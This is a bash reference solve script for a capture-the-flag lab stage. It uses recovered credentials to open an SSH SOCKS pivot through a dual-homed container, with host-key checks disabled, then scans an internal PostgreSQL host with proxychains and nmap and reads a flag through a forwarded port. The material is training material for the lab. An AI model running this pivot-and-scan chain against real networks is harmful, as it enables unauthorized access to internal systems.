#!/usr/bin/env bash
#
# S06 - Behind the Firewall
# Reference solve script for the intended pivot chain.
#
# Authorized use only inside the isolated Operation Poisoned Pipeline lab.
#
# Intended chain:
#   1. Confirm Kali cannot reach PostgreSQL directly.
#   2. Confirm the Application Challenge container is the only dual-homed host.
#   3. Use the S05-recovered pivot credential to create an SSH SOCKS proxy
#      on Kali that forwards through the Application Challenge container.
#   4. Use proxychains to scan the internal subnet and identify PostgreSQL.
#   5. Connect to PostgreSQL with the read-only ctf_reader account and read
#      the S06 flag from ctf_final.
#
# This PoC is meant to be run from a Kali / player_net container.
# It requires: ssh, proxychains4, nmap, psql, curl.

set -euo pipefail

PIVOT_USER="${PIVOT_USER:-pivot}"
PIVOT_PASS="${PIVOT_PASS:-}"
PIVOT_HOST="${PIVOT_HOST:-nexora-app}"
PIVOT_PORT="${PIVOT_PORT:-22}"

DB_USER="${DB_USER:-ctf_reader}"
DB_PASS="${DB_PASS:-}"
DB_HOST="${DB_HOST:-10.13.20.10}"
DB_PORT="${DB_PORT:-5432}"
DB_NAME="${DB_NAME:-nexora_prod}"

SOCKS_PORT="${SOCKS_PORT:-1080}"

SSH_CTL_DIR="$(mktemp -d)"
SSH_CTL_SOCK="${SSH_CTL_DIR}/s06.sock"
PROXYCHAINS_CONF="$(mktemp)"

cleanup() {
  if [[ -S "${SSH_CTL_SOCK}" ]]; then
    ssh -S "${SSH_CTL_SOCK}" -O exit "${PIVOT_USER}@${PIVOT_HOST}" >/dev/null 2>&1 || true
  fi
  rm -rf "${SSH_CTL_DIR}"
  rm -f "${PROXYCHAINS_CONF}"
}
trap cleanup EXIT

if [[ -z "${PIVOT_PASS}" ]]; then
  echo "[ERROR] PIVOT_PASS not set." >&2
  echo "Set PIVOT_PASS to the S06 pivot password recovered during S05." >&2
  exit 1
fi

if [[ -z "${DB_PASS}" ]]; then
  echo "[ERROR] DB_PASS not set." >&2
  echo "Set DB_PASS to the ctf_reader password recovered from the application container." >&2
  exit 1
fi

echo "=============================================================="
echo " S06 - Behind the Firewall reference PoC"
echo "=============================================================="
echo

echo "[1] Prove Kali cannot reach PostgreSQL directly..."
if nc -z -w 3 "${DB_HOST}" "${DB_PORT}" >/dev/null 2>&1; then
  echo "    [!] Unexpected: ${DB_HOST}:${DB_PORT} reachable directly. Aborting."
  exit 1
fi
echo "    PASS: direct connection to ${DB_HOST}:${DB_PORT} failed as expected."

echo
echo "[2] Establish SSH SOCKS proxy on 127.0.0.1:${SOCKS_PORT}..."
# sshpass is not assumed to be installed. Use SSH_ASKPASS-based
# password supply via a small helper.
ASKPASS="$(mktemp)"
cat > "${ASKPASS}" <<EOF
#!/bin/sh
echo "${PIVOT_PASS}"
EOF
chmod 0700 "${ASKPASS}"

SSH_ASKPASS="${ASKPASS}" \
SSH_ASKPASS_REQUIRE=force \
setsid -w ssh \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o PreferredAuthentications=password \
  -o PubkeyAuthentication=no \
  -o NumberOfPasswordPrompts=1 \
  -o ExitOnForwardFailure=yes \
  -M -S "${SSH_CTL_SOCK}" \
  -f -N -D "127.0.0.1:${SOCKS_PORT}" \
  -p "${PIVOT_PORT}" \
  "${PIVOT_USER}@${PIVOT_HOST}"

rm -f "${ASKPASS}"

echo "    PASS: SOCKS proxy is listening on 127.0.0.1:${SOCKS_PORT}."

echo
echo "[3] Write a temporary proxychains configuration..."
cat > "${PROXYCHAINS_CONF}" <<EOF
strict_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
socks5 127.0.0.1 ${SOCKS_PORT}
EOF
echo "    PASS: proxy chain configured."

echo
echo "[4] Proxied TCP scan of the internal subnet..."
proxychains4 -q -f "${PROXYCHAINS_CONF}" \
  nmap -sT -Pn -p 5432 "${DB_HOST}" | tee /tmp/s06-nmap.txt

if grep -q "5432/tcp open" /tmp/s06-nmap.txt; then
  echo "    PASS: PostgreSQL 5432 is reachable through the tunnel."
else
  echo "    [!] PostgreSQL port not detected through the tunnel."
  exit 1
fi

echo
echo "[5] Read-only database query through the tunnel..."
# psql does not honour proxychains' LD_PRELOAD reliably, so connect
# using the SOCKS proxy via the ssh -L shortcut instead:
LOCAL_DB_PORT=15432
ssh -S "${SSH_CTL_SOCK}" \
    -O forward \
    -L "127.0.0.1:${LOCAL_DB_PORT}:${DB_HOST}:${DB_PORT}" \
    "${PIVOT_USER}@${PIVOT_HOST}" >/dev/null

PGPASSWORD="${DB_PASS}" psql \
  -h 127.0.0.1 \
  -p "${LOCAL_DB_PORT}" \
  -U "${DB_USER}" \
  -d "${DB_NAME}" \
  -tA \
  -c "SELECT record_value FROM ctf_final WHERE record_key='s06_final_record';"

echo
echo "=============================================================="
echo " S06 PoC complete"
echo "=============================================================="
